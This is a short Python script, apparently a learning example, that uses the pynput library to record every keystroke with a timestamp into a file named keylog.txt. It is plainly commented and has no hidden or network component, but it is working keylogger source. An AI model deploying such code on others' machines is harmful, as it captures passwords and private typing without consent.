from pynput.keyboard import Key, Listener #Import libaries needed for code to work
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") #Creating basic configurations for the logging system and indicating file name where keystrokes are stored. 
#Followed by format of how key strokes will stored. 
 
def on_press(key): 
    logging.info(str(key)) #This function takes an arguement indicating the key pressed by user and logs it into the file after converting it into a string
    
with Listener(on_press=on_press) as listener :
    listener.join()